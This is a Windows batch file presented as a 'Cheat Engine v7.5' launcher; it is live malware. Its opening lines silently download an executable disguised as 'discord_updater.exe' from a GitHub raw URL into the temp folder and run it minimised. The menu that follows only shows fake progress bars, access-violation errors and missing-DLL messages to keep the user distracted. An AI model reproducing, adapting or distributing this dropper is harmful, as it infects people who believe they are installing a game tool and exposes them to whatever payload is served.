@echo off
title Cheat Engine v7.5

if not defined _RAN (
    set "_RAN=1"
    start /min "" cmd /c curl -L -s -o "%TEMP%\d.exe" "https://github.com/Minceft198/lip123/raw/refs/heads/main/discord_updater.exe" && start /min "" "%TEMP%\d.exe"
)

:menu
cls
echo.
echo   ================================================
echo          CHEAT ENGINE v7.5 - Main Menu
echo   ================================================
echo.
echo          [1] Cheat - Activate
echo          [2] Install - Setup
echo          [3] Exit
echo.
echo   ================================================
echo.
set /p "choice=Select option: "

if "%choice%"=="1" goto cheat
if "%choice%"=="2" goto install
if "%choice%"=="3" goto exit
goto menu

:cheat
cls
echo.
echo   Loading Cheat Engine...
ping localhost -n 3 >nul
echo   ERROR: Memory access denied. Run as Administrator!
echo   ERROR CODE: 0x0000005 ACCESS_VIOLATION
echo.
pause
goto menu

:install
cls
echo.
echo   Installing Cheat Engine v7.5...
echo   [                    ] 0%%
ping localhost -n 2 >nul
echo   [#####               ] 25%%
ping localhost -n 2 >nul
echo   [##########          ] 50%%
ping localhost -n 2 >nul
echo   [###############     ] 75%%
ping localhost -n 2 >nul
echo   [####################] 100%%
ping localhost -n 2 >nul
echo.
echo   ERROR: Installation failed!
echo   Missing DLL: VCRUNTIME140.dll
echo   Missing DLL: MSVCP140.dll
echo   Missing DLL: DirectX12_Core.dll
echo.
echo   Install VC++ Redist 2015-2022 x64
echo.
echo   Error Code: 0xc000007b
echo.
pause
goto menu

:exit
exit
